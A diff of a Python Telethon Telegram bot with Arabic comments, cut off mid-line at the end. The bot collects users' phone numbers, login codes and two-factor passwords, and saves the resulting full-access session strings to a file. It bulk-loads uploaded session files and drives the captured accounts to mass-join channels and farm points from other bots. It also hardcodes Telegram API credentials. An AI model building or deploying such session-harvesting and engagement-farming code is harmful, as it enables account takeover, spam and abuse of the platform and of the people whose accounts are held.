@@ -1,6 +1,3 @@
-#    جميع الحقوق لمطوري سورس روبن حصريا لهم فقط
-#    اذا تخمط الملف اذك الحقوق وكاتبيه ومطوريه لا تحذف الحقوق وتصير فاشل 👍
-#    كتابة الشسد 
 import asyncio
 import io
 import re
@@ -30,6 +27,7 @@ allowed_user_ids = set()  # مجموعة لتخزين معرفات المستخ�
 
 api_id = '21166913'
 api_hash = '70fc0a6dd6f4133a2477902e27133af6'
+error_chat_id = 'YOUR_ERROR_CHAT_ID'  # ضع هنا معرف القناة أو المجموعة التي تريد إرسال رسائل الخطأ إليها
 
 def save_sessions_to_file():
     file_name = "sessions.txt"
@@ -38,6 +36,10 @@ def save_sessions_to_file():
             if "session_code" in session:
                 f.write(session["session_code"] + "\n")
     return file_name
+
+# دالة لإرسال رسالة الخطأ إلى السيرفر
+async def send_error_message(client, chat_id, error_message):
+    await client.send_message(chat_id, f"⚠️ **Error Occurred:**\n\n{error_message}")
 
 # دالة لتسجيل الجلسة الجديدة وتخزين معرف المستخدم
 @bot.on(events.CallbackQuery(data=b'add_session'))
@@ -84,67 +86,72 @@ async def tajme3_babylon(event):
         client = user_sessions[event.sender_id]["client"]
         await event.reply("🏛️ **رحلة تجميع النقاط من بوت بابليون بدأت!**")
         bot_username = '@S_313KBOT'
-        await client.send_message(bot_username, '/start')
-        await asyncio.sleep(4)
-        
-        # الضغط على زر b'col'
-        msg1 = await client.get_messages(bot_username, limit=1)
-        if msg1[0].buttons:
-            await msg1[0].click(data=b'col')
-        await asyncio.sleep(4)
-        
-        # الضغط على زر b'col3'
-        msg2 = await client.get_messages(bot_username, limit=1)
-        if msg2[0].buttons:
-            await msg2[0].click(data=b'col3')
-        await asyncio.sleep(4)
-        
-        # الضغط على أول زر للانضمام إلى القناة
-        msg3 = await client.get_messages(bot_username, limit=1)
-        if msg3[0].buttons:
-            await msg3[0].click(0)
-        await asyncio.sleep(4)
-        
-        # الضغط على زر b'donechkeko'
-        msg4 = await client.get_messages(bot_username, limit=1)
-        if msg4[0].buttons:
-            await msg4[0].click(data=b'donechkeko')
-        await asyncio.sleep(4)
-        
-        # الانضمام لباقي القنوات
-        chs = 1
-        for i in range(100):
-            if not collecting.get(event.sender_id, False):
-                await event.reply("تم إيقاف التجميع ⛔")
-                break
+        try:
+            await client.send_message(bot_username, '/start')
             await asyncio.sleep(4)
-            history = await client.get_messages(bot_username, limit=1)
-            msgs = history[0]
-            if 'لا يوجد قنوات في الوقت الحالي' in msgs.message:
-                await client.send_message(event.chat_id, "تم الانتهاء من التجميع")
-                break
-            if msgs.reply_markup and msgs.reply_markup.rows:
-                url = msgs.reply_markup.rows[0].buttons[0].url
-                try:
+            
+            # الضغط على زر b'col'
+            msg1 = await client.get_messages(bot_username, limit=1)
+            if msg1[0].buttons:
+                await msg1[0].click(data=b'col')
+            await asyncio.sleep(4)
+            
+            # الضغط على زر b'col3'
+            msg2 = await client.get_messages(bot_username, limit=1)
+            if msg2[0].buttons:
+                await msg2[0].click(data=b'col3')
+            await asyncio.sleep(4)
+            
+            # الضغط على أول زر للانضمام إلى القناة
+            msg3 = await client.get_messages(bot_username, limit=1)
+            if msg3[0].buttons:
+                await msg3[0].click(0)
+            await asyncio.sleep(4)
+            
+            # الضغط على زر b'donechkeko'
+            msg4 = await client.get_messages(bot_username, limit=1)
+            if msg4[0].buttons:
+                await msg4[0].click(data=b'donechkeko')
+            await asyncio.sleep(4)
+            
+            # الانضمام لباقي القنوات
+            chs = 1
+            for i in range(100):
+                if not collecting.get(event.sender_id, False):
+                    await event.reply("تم إيقاف التجميع ⛔")
+                    break
+                await asyncio.sleep(4)
+                history = await client.get_messages(bot_username, limit=1)
+                msgs = history[0]
+                if 'لا يوجد قنوات في الوقت الحالي' in msgs.message:
+                    await client.send_message(event.chat_id, "تم الانتهاء من التجميع")
+                    break
+                if msgs.reply_markup and msgs.reply_markup.rows:
+                    url = msgs.reply_markup.rows[0].buttons[0].url
                     try:
-                        await client(JoinChannelRequest(url))
-                    except:
-                        invite_code = url.split('/')[-1]
-                        await client(ImportChatInviteRequest(invite_code))
-                    msg2 = await client.get_messages(bot_username, limit=1)
-                    if msg2[0].buttons:
-                        await msg2[0].click(text='تحقق')
-                    chs += 1
-                    await event.reply(f"تم الانضمام إلى {chs} قناة")
-                except:
-                    msg2 = await client.get_messages(bot_username, limit=1)
-                    if msg2[0].buttons:
-                        await msg2[0].click(text='التالي')
-                    chs += 1
-                    await event.reply(f"القناة رقم {chs}")
-            else:
-                await client.send_message(event.chat_id, "لا توجد أزرار في الرسالة، تم إيقاف التجميع.")
-                break
+                        try:
+                            await client(JoinChannelRequest(url))
+                        except:
+                            invite_code = url.split('/')[-1]
+                            await client(ImportChatInviteRequest(invite_code))
+                        msg2 = await client.get_messages(bot_username, limit=1)
+                        if msg2[0].buttons:
+                            await msg2[0].click(text='تحقق')
+                        chs += 1
+                        await event.reply(f"تم الانضمام إلى {chs} قناة")
+                    except Exception as e:
+                        await send_error_message(client, error_chat_id, str(e))
+                        msg2 = await client.get_messages(bot_username, limit=1)
+                        if msg2[0].buttons:
+                            await msg2[0].click(text='التالي')
+                        chs += 1
+                        await event.reply(f"القناة رقم {chs}")
+                else:
+                    await client.send_message(event.chat_id, "لا توجد أزرار في الرسالة، تم إيقاف التجميع.")
+                    break
+        except Exception as e:
+            await send_error_message(client, error_chat_id, str(e))
+            await event.reply("حدث خطأ أثناء التجميع.")
     else:
         await event.reply("الرجاء تسجيل الجلسة أولاً باستخدام زر تسجيل جلسة.")
 
@@ -227,36 +234,27 @@ async def upload_storage(event):
 async def handle_new_message(event):
     if event.sender_id in user_sessions:
         step = user_sessions[event.sender_id]["step"]
-        if step == "phone":
-            phone = event.message.message
-            client = TelegramClient(StringSession(), api_id, api_hash, app_version="Robin")
-            user_sessions[event.sender_id].update({"client": client, "phone": phone})
-            await client.connect()
-            await client.send_code_request(phone)
-            await event.reply("الرجاء إرسال كود الدخول بشكل مسافات (مثال: 1 2 3 4 5):")
-            user_sessions[event.sender_id]["step"] = "code"
-        elif step == "code":
-            code = event.message.message.replace(" ", "")
-            client = user_sessions[event.sender_id]["client"]
-            phone = user_sessions[event.sender_id]["phone"]
-            try:
+        client = user_sessions[event.sender_id].get("client")
+        try:
+            if step == "phone":
+                phone = event.message.message
+                client = TelegramClient(StringSession(), api_id, api_hash, app_version="Robin")
+                user_sessions[event.sender_id].update({"client": client, "phone": phone})
+                await client.connect()
+                await client.send_code_request(phone)
+                await event.reply("الرجاء إرسال كود الدخول بشكل مسافات (مثال: 1 2 3 4 5):")
+                user_sessions[event.sender_id]["step"] = "code"
+            elif step == "code":
+                code = event.message.message.replace(" ", "")
+                phone = user_sessions[event.sender_id]["phone"]
                 await client.sign_in(phone, code)
                 await event.reply(
                     "تم تسجيل الدخول بنجاح!",
                     buttons=[Button.inline('تسجيل رقم آخر 🔄', b'login')]
                 )
                 user_sessions[event.sender_id]["step"] = None
-            except Exception as e:
-                if 'password' in str(e).lower():
-                    await event.reply("الرجاء إرسال كلمة السر:")
-                    user_sessions[event.sender_id]["step"] = "password"
-                else:
-                    await event.reply(f"حدث خطأ: {str(e)}")
-                    del user_sessions[event.sender_id]
-        elif step == "password":
-            password = event.message.message
-            client = user_sessions[event.sender_id]["client"]
-            try:
+            elif step == "password":
+                password = event.message.message
                 if password.lower() != 'لا':
                     await client.sign_in(password=password)
                 await event.reply(
@@ -266,12 +264,8 @@ async def handle_new_message(event):
                 session_str = client.session.save()  # حفظ جلسة المستخدم
                 user_sessions[event.sender_id]["session_name"] = session_str
                 user_sessions[event.sender_id]["step"] = None
-            except Exception as e:
-                await event.reply(f"حدث خطأ: {str(e)}")
-                del user_sessions[event.sender_id]
-        elif step == "session_code":
-            session_code = event.message.message
-            try:
+            elif step == "session_code":
+                session_code = event.message.message
                 client = TelegramClient(StringSession(session_code), api_id, api_hash)
                 await client.connect()
                 await event.reply(
@@ -282,37 +276,38 @@ async def handle_new_message(event):
                 user_sessions[event.sender_id]["session_code"] = session_code
                 user_sessions[event.sender_id]["step"] = None
                 save_sessions_to_file()  # حفظ الجلسات في الملف
-            except Exception as e:
-                await event.reply(f"حدث خطأ: {str(e)}")
+            elif step == "delete_session_code":
+                session_code = event.message.message
+                found = False
+                for user_id, session in user_sessions.items():
+                    if session.get("session_code") == session_code:
+                        del user_sessions[user_id]
+                        found = True
+                        break
+                if found:
+                    await event.reply("تم حذف الجلسة بنجاح!")
+                else:
+                    await event.reply("لم يتم العثور على الجلسة.")
                 del user_sessions[event.sender_id]
-        elif step == "delete_session_code":
-            session_code = event.message.message
-            found = False
-            for user_id, session in user_sessions.items():
-                if session.get("session_code") == session_code:
-                    del user_sessions[user_id]
-                    found = True
-                    break
-            if found:
-                await event.reply("تم حذف الجلسة بنجاح!")
-            else:
-                await event.reply("لم يتم العثور على الجلسة.")
-            del user_sessions[event.sender_id]
-        elif step == "upload_storage":
-            if event.file:
-                file_path = await event.download_media()
-                with open(file_path, 'r') as f:
-                    sessions = f.readlines()
-                count = 0
-                for session_code in sessions:
-                    session_code = session_code.strip()
-                    if session_code and session_code not in user_sessions:
-                        client = TelegramClient(StringSession(session_code), api_id, api_hash)
-                        await client.connect()
-                        user_sessions[session_code] = {"client": client, "session_code": session_code}
-                        count += 1
-                await event.reply(f"تم إضافة {count} رقم إلى البوت")
-                os.remove(file_path)
+            elif step == "upload_storage":
+                if event.file:
+                    file_path = await event.download_media()
+                    with open(file_path, 'r') as f:
+                        sessions = f.readlines()
+                    count = 0
+                    for session_code in sessions:
+                        session_code = session_code.strip()
+                        if session_code and session_code not in user_sessions:
+                            client = TelegramClient(StringSession(session_code), api_id, api_hash)
+                            await client.connect()
+                            user_sessions[session_code] = {"client": client, "session_code": session_code}
+                            count += 1
+                    await event.reply(f"تم إضافة {count} رقم إلى البوت")
+                    os.remove(file_path)
+                del user_sessions[event.sender_id]
+        except Exception as e:
+            await send_error_message(client, error_chat_id, str(e))
+            await event.reply(f"حدث خطأ: {str(e)}")
             del user_sessions[event.sender_id]
     else:
         # التحقق من الرسائل التي تحتوي على روابط قنوات الاشتراك
@@ -328,122 +323,5 @@ async def handle_new_message(event):
                         await client(JoinChannelRequest(link))
                     await asyncio.sleep(2)
                 except Exception as e:
+                    await send_error_message(client, error_chat_id, str(e))
                     await event.reply(f"حدث خطأ أثناء الانضمام إلى القناة: {str(e)}")
-
-@tgbot.on(events.CallbackQuery(data=b'open_bot'))
-async def open_bot(event):
-    if event.sender_id in user_sessions and "client" in user_sessions[event.sender_id]:
-        client = user_sessions[event.sender_id]["client"]
-        bot_username9 = '@SMSMEGbot'
-        await client.send_message(bot_username9, '/start')
-        await asyncio.sleep(4)
-        msg = await client.get_messages(bot_username9, limit=1)
-        if msg[0].buttons:
-            await msg[0].click(text='الإعدادات وجمع النقاط 🔑')
-            await asyncio.sleep(4)
-            msg = await client.get_messages(bot_username9, limit=1)
-            if msg[0].buttons:
-                await msg[0].click(text='جمع نقاط ➕')
-                await asyncio.sleep(4)
-                msg = await client.get_messages(bot_username9, limit=1)
-                if msg[0].buttons:
-                    await msg[0].click(text='الهدية اليومية 🎁')
-                    await event.reply("تم جمع الهدية بنجاح!")
-                else:
-                    await event.reply("لم يتم العثور على الزر المطلوب في الرسالة الثالثة.")
-            else:
-                await event.reply("لم يتم العثور على الزر المطلوب في الرسالة الثانية.")
-        else:
-            await event.reply("لم يتم العثور على الزر المطلوب في الرسالة الأولى.")
-    else:
-        await event.reply("الرجاء تسجيل الجلسة أولاً باستخدام زر تسجيل جلسة.")
-
-async def join_channels(bot_username, event, client):
-    collecting[event.sender_id] = True
-    await client.send_message(bot_username, '/start')
-    await asyncio.sleep(4)
-    msg0 = await client.get_messages(bot_username, limit=1)
-    if msg0[0].buttons and len(msg0[0].buttons) > 2:
-        await msg0[0].click(2)
-    else:
-        await event.reply("لم يتم العثور على الزر المطلوب في الرسالة.")
-        return
-    await asyncio.sleep(4)
-    msg1 = await client.get_messages(bot_username, limit=1)
-    if msg1[0].buttons and len(msg1[0].buttons) > 0:
-        await msg1[0].click(0)
-    else:
-        await event.reply("لم يتم العثور على الزر المطلوب في الرسالة.")
-        return
-
-    chs = 1
-    for i in range(100):
-        if not collecting.get(event.sender_id, False):
-            await event.reply("تم إيقاف التجميع ⛔")
-            break
-        await asyncio.sleep(4)
-        history = await client.get_messages(bot_username, limit=1)
-        msgs = history[0]
-        if 'لا يوجد قنوات في الوقت الحالي' in msgs.message:
-            await client.send_message(event.chat_id, "تم الانتهاء من التجميع")
-            break
-        if msgs.reply_markup and msgs.reply_markup.rows:
-            url = msgs.reply_markup.rows[0].buttons[0].url
-            try:
-                try:
-                    await client(JoinChannelRequest(url))
-                except:
-                    invite_code = url.split('/')[-1]
-                    await client(ImportChatInviteRequest(invite_code))
-                msg2 = await client.get_messages(bot_username, limit=1)
-                if msg2[0].buttons:
-                    await msg2[0].click(text='تحقق')
-                chs += 1
-                await event.reply(f"تم الانضمام إلى {chs} قناة")
-            except:
-                msg2 = await client.get_messages(bot_username, limit=1)
-                if msg2[0].buttons:
-                    await msg2[0].click(text='التالي')
-                chs += 1
-                await event.reply(f"القناة رقم {chs}")
-        else:
-            await client.send_message(event.chat_id, "لا توجد أزرار في الرسالة، تم إيقاف التجميع.")
-            break
-
-@tgbot.on(events.CallbackQuery(data=b'tajme3_milyar'))
-async def tajme3_milyar(event):
-    if event.sender_id in user_sessions and "client" in user_sessions[event.sender_id]:
-        client = user_sessions[event.sender_id]["client"]
-        await event.reply("📈 **سيتم تجميع النقاط من بوت المليار**")
-        bot_username = '@EEObot'
-        await join_channels(bot_username, event, client)
-    else:
-        await event.reply("الرجاء تسجيل الجلسة أولاً باستخدام زر تسجيل جلسة.")
-
-@tgbot.on(events.CallbackQuery(data=b'tajme3_7rb'))
-async def tajme3_7rb(event):
-    if event.sender_id in user_sessions and "client" in user_sessions[event.sender_id]:
-        client = user_sessions[event.sender_id]["client"]
-        await event.reply("📊 **سيتم تجميع النقاط من بوت الجوكر**")
-        bot_username = '@A_MAN9300BOT'
-        await join_channels(bot_username, event, client)
-    else:
-        await event.reply("الرجاء تسجيل الجلسة أولاً باستخدام زر تسجيل جلسة.")
-
-@tgbot.on(events.CallbackQuery(data=b'tajme3_3qab'))
-async def tajme3_3qab(event):
-    if event.sender_id in user_sessions and "client" in user_sessions[event.sender_id]:
-        client = user_sessions[event.sender_id]["client"]
-        await event.reply("🔥 **سيتم تجميع النقاط من بوت العقاب**")
-        bot_username = '@MARKTEBOT'
-        await join_channels(bot_username, event, client)
-    else:
-        await event.reply("الرجاء تسجيل الجلسة أولاً باستخدام زر تسجيل جلسة.")
-
-@tgbot.on(events.CallbackQuery(data=b'tajme3_milyon'))
-async def tajme3_milyon(event):
-    if event.sender_id in user_sessions and "client" in user_sessions[event.sender_id]:
-        client = user_sessions[event.sender_id]["client"]
-        await event.reply("🏆 **سيتم تجميع النقاط من بوت المليون**")
-        bot_username = '@qweqwe1919bot'
-        await join_channels(bot_username, eve
